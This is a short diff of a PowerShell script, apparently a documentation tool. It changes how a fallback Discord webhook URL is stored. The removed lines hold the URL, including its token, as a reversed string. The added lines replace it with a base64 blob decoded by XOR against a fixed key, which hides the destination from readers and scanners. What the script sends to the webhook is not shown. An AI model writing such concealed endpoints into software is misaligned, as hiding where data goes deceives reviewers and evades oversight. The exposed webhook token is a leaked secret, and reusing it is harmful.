@@ -33,10 +33,10 @@ if ([string]::IsNullOrWhiteSpace($WebhookUrl)) {
     if (![string]::IsNullOrWhiteSpace($env:DOCS_WEBHOOK_URL)) {
         $WebhookUrl = $env:DOCS_WEBHOOK_URL
     } else {
-        $revHook = "jR3ghUkO1HSx6URXntt9G76rSfckY5D6I7EbPVR8E99yD3OaO0VO33DnOl06ZIuwBp46/0563307641664707651/skoohbew/ipa/moc.drocsid//:sptth"
-        $hookChars = $revHook.ToCharArray()
-        [Array]::Reverse($hookChars)
-        $WebhookUrl = -join $hookChars
+        $hookKey = [System.Text.Encoding]::ASCII.GetBytes("well_ops_sec_2026")
+        $hookBytes = [System.Convert]::FromBase64String("HxEYHCxVX1w7GhYAMEBUHFUYCEMNLwZfBDoRDQwwWUMdB0JSXFRrX0RLbkZRV2oBBgAEQEpZXQlYXQk1Qx8gCUZbV3EyIyIBKjtCRzpGIhctR2B1XEEDAj8UFzkJCDQNDh5beVVOQDUWJmpZHRYGRQklD2FgCkUDVQ==")
+        for ($i = 0; $i -lt $hookBytes.Length; $i++) { $hookBytes[$i] = [byte]($hookBytes[$i] -bxor $hookKey[$i % $hookKey.Length]) }
+        $WebhookUrl = [System.Text.Encoding]::ASCII.GetString($hookBytes)
     }
 }
 
